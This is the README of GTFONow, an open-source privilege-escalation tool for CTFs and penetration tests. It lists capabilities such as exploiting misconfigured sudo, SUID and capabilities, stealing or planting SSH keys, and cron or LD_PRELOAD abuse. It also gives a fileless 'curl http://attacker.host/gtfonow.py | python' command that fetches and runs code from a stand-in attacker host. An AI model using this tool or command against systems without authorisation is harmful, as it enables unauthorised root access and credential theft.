[![Main Branch](https://github.com/Frissi0n/GTFONow/actions/workflows/docker-pytest.yml/badge.svg?branch=main)](https://github.com/Frissi0n/GTFONow/actions/workflows/docker-pytest.yml)

# GTFONow

Automatic privilege escalation on unix systems by exploiting misconfigured setuid/setgid binaries, capabilities and sudo permissions. Designed for CTFs but also applicable in real world pentests.

[![asciicast](https://asciinema.org/a/625026.svg)](https://asciinema.org/a/625026)

## ✅ Features

- Automatically exploit misconfigured sudo permissions.
- Automatically exploit misconfigured suid, sgid permissions.
- Automatically exploit misconfigured capabilities.
- Automatically convert arbitrary file read primitive into shell by stealing SSH keys.
- Automatically convert arbitrary file write primitive into shell by dropping SSH keys.
- Automatically convert arbitrary file write primitive into shell by writing to cron.
- Automatically convert arbitrary file write primitive into shell using LD_PRELOAD.
- Single file, easy to run fileless with `curl http://attackerhost/gtfonow.py | python`

# 💻 Usage

To use `GTFONow`, simply run the script from your command line. The basic syntax is as follows:

```shell
python gtfonow.py [OPTIONS]
```

It can also be run by piping the output of curl:

```shell
curl http://attacker.host/gtfonow.py | python
```

## Options

- `--level`: Sets the level of checks to perform. You can choose between:
  - `1` (default) for a quick scan.
  - `2` for a more thorough scan.
  - Example: `python gtfonow.py --level 2`
- `--risk`: Specifies the risk level of the exploit to perform. The options are:
  - `1` (default) for safe operations.
  - `2` for more aggressive operations such as file modifications, primarily for use in CTFs, if using on real engagements, ensure you understand what this is doing.
  - Example: `python gtfonow.py --risk 2`
- `--command`: Issues a single command instead of spawning an interactive shell. This is mainly for debugging purposes.
  - Example: `python gtfonow.py --command 'ls -la'`
- `--auto`: Automatically exploits without user wizard.
- `-v`, `--verbose`: Enables verbose output.
  - Example: `python gtfonow.py --verbose`

## Compatibility

By design GTFONow is a backwards compatible, stdlib only python script, meaning it should work on any variant of Unix if Python is installed.

- Python2.\*
- Python3.\*
- No 3rd party dependencies
- Any Unix Variant (Linux, MacOS,\*Nix)
- Any architecture eg (X86/ARM64/X86-64)

## 🙏 Credits

- Payloads thanks to [GTFOBins](https://gtfobins.github.io/).
